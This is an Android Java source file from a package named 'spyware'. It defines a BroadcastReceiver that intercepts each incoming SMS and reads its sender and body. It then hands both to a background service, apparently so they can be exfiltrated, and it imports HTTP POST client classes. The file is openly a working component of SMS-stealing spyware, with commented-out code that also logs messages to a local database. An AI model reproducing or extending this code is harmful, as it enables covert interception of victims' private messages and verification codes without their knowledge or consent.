package com.example.administrator.spyware;

import android.app.ProgressDialog;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.os.AsyncTask;
import android.os.Bundle;
import android.service.carrier.CarrierMessagingService;
import android.telephony.SmsMessage;
import android.widget.TextView;
import android.widget.Toast;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.util.EntityUtils;

import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.util.ArrayList;
import java.util.List;

/**
 * Created by Administrator on 12/21/2015.
 */
public class MyBroadcastReceiver extends BroadcastReceiver {
    public static final String ACTION = "android.provider.Telephony.SMS_RECEIVED";

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction().equals(ACTION)) {
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                Object[] pdus = (Object[]) bundle.get("pdus");
                SmsMessage[] messages = new SmsMessage[pdus.length];
                for (int i = 0; i < pdus.length; i++) {
                    messages[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
                }
                for (SmsMessage message : messages) {

                    String strMessageFrom = message.getDisplayOriginatingAddress();
                    String strMessageBody = message.getDisplayMessageBody();

                    //Toast.makeText(context, "SMS Message received from:" + strMessageFrom, Toast.LENGTH_LONG).show();
                    //Toast.makeText(context, "SMS Message content" + strMessageBody, Toast.LENGTH_LONG).show();
                 /*   Intent i=new Intent("broadcast");
                    i.putExtra("SmsContent",strMessageBody);
                    i.putExtra("SmsFrom",strMessageFrom);
                    context.sendBroadcast(i);*/
                   /* Database db=new Database(context);
                    String query="INSERT INTO thongtin VALUES(null"+","+strMessageBody+","+strMessageFrom+")";
                    db.Query_Data("CREATE TABLE IF NOT EXISTS thongtin(_id INTEGER PRIMARY KEY,noidung VARCHAR(200) NOT NULL,nguoigui VARCHAR(200) NOT NULL)");
                  //  db.Query_Data("INSERT INTO thongtin VALUES(null,SmsContent,SmsFrom)");
                    Item i=new Item(strMessageBody,strMessageFrom);
                    db.add(i,"thongtin");*/
                    //context.stopService(new Intent(context, Send.class));
                   // context.startService(new Intent(context, Send.class));
                    Intent serviceIntent = new Intent();
                    serviceIntent.setAction("com.enea.training.bootdemo.BootDemoService");
                    serviceIntent.putExtra("content",strMessageBody);
                    serviceIntent.putExtra("from",strMessageFrom);
                    context.startService(serviceIntent);

                }
            }
        }

    }
}

